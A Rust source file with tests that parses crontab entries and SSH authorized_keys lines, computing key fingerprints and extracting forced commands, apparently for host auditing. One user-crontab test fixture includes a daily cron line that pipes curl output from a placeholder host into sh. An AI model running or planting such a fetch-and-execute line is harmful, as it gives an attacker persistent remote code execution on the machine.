use sha2::{Digest, Sha256};

#[derive(Debug, PartialEq, Eq)]
pub struct CronEntry {
    pub entry: String,
    pub user: Option<String>,
    pub command: String,
}

fn leading_fields(line: &str, count: usize) -> Option<(String, &str)> {
    let mut rest = line.trim_start();
    let mut fields = Vec::with_capacity(count);
    for _ in 0..count {
        let end = rest.find(char::is_whitespace)?;
        fields.push(&rest[..end]);
        rest = rest[end..].trim_start();
    }
    Some((fields.join(" "), rest))
}

fn parse_cron_line(line: &str, names_user: bool) -> Option<CronEntry> {
    let schedule_fields = match line.chars().next()? {
        '@' => 1,
        first if first == '*' || first == '-' || first.is_ascii_digit() => 5,
        _ => return None,
    };

    let (schedule, rest) = leading_fields(line, schedule_fields)?;
    let (user, command) = if names_user {
        let (user, command) = leading_fields(rest, 1)?;
        (Some(user), command)
    } else {
        (None, rest)
    };
    if command.is_empty() {
        return None;
    }

    let entry = match &user {
        Some(user) => format!("{} {} {}", schedule, user, command),
        None => format!("{} {}", schedule, command),
    };
    Some(CronEntry { entry, user, command: command.to_string() })
}

pub fn parse_crontab(contents: &str, names_user: bool) -> Vec<CronEntry> {
    contents.lines().filter_map(|line| parse_cron_line(line.trim(), names_user)).collect()
}

#[derive(Debug, PartialEq, Eq)]
pub struct AuthorizedKey {
    pub key_type: String,
    pub fingerprint: String,
    pub hash: String,
    pub comment: String,
    pub forced_command: String,
}

fn split_unquoted(text: &str, is_separator: impl Fn(char) -> bool) -> (&str, &str) {
    let mut quoted = false;
    let mut escaped = false;
    for (index, character) in text.char_indices() {
        if character == '"' && !escaped {
            quoted = !quoted;
        } else if !quoted && is_separator(character) {
            return (&text[..index], &text[index + character.len_utf8()..]);
        }
        escaped = character == '\\' && !escaped;
    }
    (text, "")
}

fn next_word(text: &str) -> (&str, &str) {
    let (word, rest) = split_unquoted(text, char::is_whitespace);
    (word, rest.trim_start())
}

fn is_key_type(word: &str) -> bool {
    ["ssh-", "ecdsa-", "sk-"].iter().any(|prefix| word.starts_with(prefix))
}

fn forced_command(mut options: &str) -> String {
    const OPTION: &str = "command=\"";

    while !options.is_empty() {
        let (option, rest) = split_unquoted(options, |character| character == ',');
        let is_command = option.get(..OPTION.len()).is_some_and(|name| name.eq_ignore_ascii_case(OPTION));
        if let Some(command) = option.strip_suffix('"').filter(|_| is_command).and_then(|option| option.get(OPTION.len()..)) {
            return command.replace("\\\"", "\"");
        }
        options = rest;
    }

    String::new()
}

fn base64_decode(text: &str) -> Option<Vec<u8>> {
    let mut bytes = Vec::with_capacity(text.len() * 3 / 4);
    let mut buffer = 0u32;
    let mut bits = 0;

    for character in text.trim_end_matches('=').bytes() {
        let value = match character {
            b'A'..=b'Z' => character - b'A',
            b'a'..=b'z' => character - b'a' + 26,
            b'0'..=b'9' => character - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => return None,
        };
        buffer = (buffer << 6) | u32::from(value);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            bytes.push((buffer >> bits) as u8);
            buffer &= (1 << bits) - 1;
        }
    }

    (!bytes.is_empty()).then_some(bytes)
}

fn base64_encode(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let mut text = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let group = chunk.iter().fold(0u32, |group, byte| (group << 8) | u32::from(*byte)) << (8 * (3 - chunk.len()));
        for position in 0..=chunk.len() {
            text.push(char::from(ALPHABET[((group >> (18 - 6 * position)) & 63) as usize]));
        }
    }
    text
}

fn parse_authorized_key(line: &str) -> Option<AuthorizedKey> {
    if line.starts_with('#') {
        return None;
    }

    let (first, rest) = next_word(line);
    let (options, key_type, rest) = if is_key_type(first) {
        ("", first, rest)
    } else {
        let (key_type, rest) = next_word(rest);
        (first, key_type, rest)
    };
    if !is_key_type(key_type) {
        return None;
    }

    let (key, comment) = next_word(rest);
    let digest = Sha256::digest(base64_decode(key)?);

    Some(AuthorizedKey {
        key_type: key_type.to_string(),
        fingerprint: format!("SHA256:{}", base64_encode(&digest)),
        hash: hex::encode(digest),
        comment: comment.trim().to_string(),
        forced_command: forced_command(options),
    })
}

pub fn parse_authorized_keys(contents: &str) -> Vec<AuthorizedKey> {
    contents.lines().filter_map(|line| parse_authorized_key(line.trim())).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    const ED25519_KEY: &str = "AAAAC3NzaC1lZDI1NTE5AAAAIKhakgEouqfK6smUqU2sY0O1i5Xj6lq+6llCBtQfPYeO";
    const ED25519_FINGERPRINT: &str = "SHA256:qyZYFDs7jXkFw3lnFg23jK1InOXW7kSZfPKbC/4mEWc";
    const RSA_KEY: &str = "AAAAB3NzaC1yc2EAAAADAQABAAABAQDqFW2kVcjA2zcCf+gw4A+Yfs7lKoFfRzpk+in+zkBsEzaw9Sv3Z/Ei9sw0ru4ePZFjWzuqPVkyikD1VwkiODB6ahcjjCXx8ViY01f4RjuI8VQKn0GgBDNmugBuOmZeO5B2kDlOz9OGd94RcIQBocTzQZJ3BIdVYxXYDunyWRdeWPbGo89g9qbPck+tTkYs+fgx7A74kChGlxaQobC/1NA1LnMv9+BzPuOvnZD62vVf+hRqPj3Q6eptK1pMdLuwncaWpNDH0VkE86jHgVciiUVFV9cWplCp5IoN+aHK4E+6/bybK37BcgvMJIAjfzBYA2onS5c79Nt51BxYyQl6hUbR";
    const RSA_FINGERPRINT: &str = "SHA256:qNpsBn/8APvjPWik3bwhZK9tYTEcIAFwK08Cjib/FjY";

    fn cron_entry(entry: &str, user: Option<&str>, command: &str) -> CronEntry {
        CronEntry { entry: entry.to_string(), user: user.map(str::to_string), command: command.to_string() }
    }

    #[test]
    fn test_system_crontab_lines_name_a_schedule_a_user_and_a_command() {
        let entries = parse_crontab(
            concat!(
                "# m h dom mon dow user command\n",
                "SHELL=/bin/sh\n",
                "PATH=/usr/sbin:/usr/bin\n",
                "\n",
                "17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n",
                "@reboot  www-data  /srv/start.sh --now\n",
                "-*/5 * * * * root /usr/bin/quiet\n",
                "* * * * *\n",
                "* * * * * root\n",
                "not a cron line\n",
            ),
            true,
        );

        assert_eq!(
            entries,
            vec![
                cron_entry("17 * * * * root cd / && run-parts --report /etc/cron.hourly", Some("root"), "cd / && run-parts --report /etc/cron.hourly"),
                cron_entry("@reboot www-data /srv/start.sh --now", Some("www-data"), "/srv/start.sh --now"),
                cron_entry("-*/5 * * * * root /usr/bin/quiet", Some("root"), "/usr/bin/quiet"),
            ]
        );
    }

    #[test]
    fn test_user_crontab_lines_have_no_user_field() {
        let entries = parse_crontab("MAILTO=\"\"\n0 3 * * 1-5 /home/dana/backup.sh > /dev/null 2>&1\n@daily curl -s https://example.test/x | sh\n", false);

        assert_eq!(
            entries,
            vec![
                cron_entry("0 3 * * 1-5 /home/dana/backup.sh > /dev/null 2>&1", None, "/home/dana/backup.sh > /dev/null 2>&1"),
                cron_entry("@daily curl -s https://example.test/x | sh", None, "curl -s https://example.test/x | sh"),
            ]
        );
    }

    #[test]
    fn test_authorized_keys_are_named_by_the_fingerprint_ssh_keygen_prints() {
        let contents = [
            "# deploy keys".to_string(),
            String::new(),
            format!("ssh-ed25519 {} deploy@ci", ED25519_KEY),
            format!(r#"command="/usr/bin/rsync --server \"$SSH_ORIGINAL_COMMAND\", really",no-pty,from="10.0.0.0/8" ssh-rsa {} ops laptop"#, RSA_KEY),
            "ssh-ed25519 not*base64 broken".to_string(),
            "restrict no-key-on-this-line".to_string(),
        ]
        .join("\n");

        let keys = parse_authorized_keys(&contents);

        assert_eq!(keys.len(), 2, "comments, broken keys and lines without a key are not keys");
        assert_eq!(keys[0].key_type, "ssh-ed25519");
        assert_eq!(keys[0].fingerprint, ED25519_FINGERPRINT);
        assert_eq!(keys[0].comment, "deploy@ci");
        assert_eq!(keys[0].forced_command, "");
        assert_eq!(keys[1].key_type, "ssh-rsa");
        assert_eq!(keys[1].fingerprint, RSA_FINGERPRINT);
        assert_eq!(keys[1].comment, "ops laptop");
        assert_eq!(keys[1].forced_command, r#"/usr/bin/rsync --server "$SSH_ORIGINAL_COMMAND", really"#);
        assert_eq!(keys[0].hash.len(), 64);
        assert_ne!(keys[0].hash, keys[1].hash);
    }
}
